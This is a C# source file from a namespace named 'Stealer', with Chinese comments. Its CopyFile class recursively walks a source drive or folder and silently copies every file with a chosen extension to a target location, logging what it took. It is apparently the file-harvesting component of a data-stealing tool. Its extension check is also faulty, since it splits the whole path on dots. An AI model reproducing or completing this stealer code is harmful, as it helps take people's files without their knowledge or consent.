using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer
{
	class CopyFile
	{
		private string _sourcePath;
		private string _targetPath;
		private string _fileName;
		private string[] fileExtensionList;
		private string log= "";

		public CopyFile(string sourcePath, string targetPath, string fileName, string[] fileExtensionList)
		{
			_sourcePath = sourcePath;
			_targetPath = targetPath;
			_fileName = fileName;
			this.fileExtensionList = fileExtensionList;
		}

		public string Copy()
		{
			CopyToDisk(_sourcePath, _targetPath);
			return log;
		}

		private void CopyToDisk(string sourcePath, string targetPath)
		{
			try
			{
				if (!Directory.Exists(targetPath))
					Directory.CreateDirectory(targetPath);

				// 查询文件夹
				foreach (string sub in Directory.GetDirectories(sourcePath))
				{
					if (!sub.Contains("System Volume Information") && !sub.Contains(_fileName))
					{
						CopyToDisk(sub, Path.Combine(targetPath, sub.Split('\\').Last()));
					}
				}

				// 复制文件
				foreach (string file in Directory.GetFiles(sourcePath))
				{
					string[] pathList = file.Split('\\');

					string fileName = pathList[pathList.Length - 1];
					string fileExtension = file.Split('.')[1];

					foreach(string fExtension in fileExtensionList)
					{
						if (fileExtension.ToLower().Equals(fExtension))
						{
							File.Copy(file, Path.Combine(targetPath, fileName), true);
							log += ("成功复制：" + fileName + "   ");
							break;
						}
					}
				}
			}
			catch (Exception ex)
			{
				log += ("复制出错：" + ex.Message + "   ");
			}
		}
	}
}
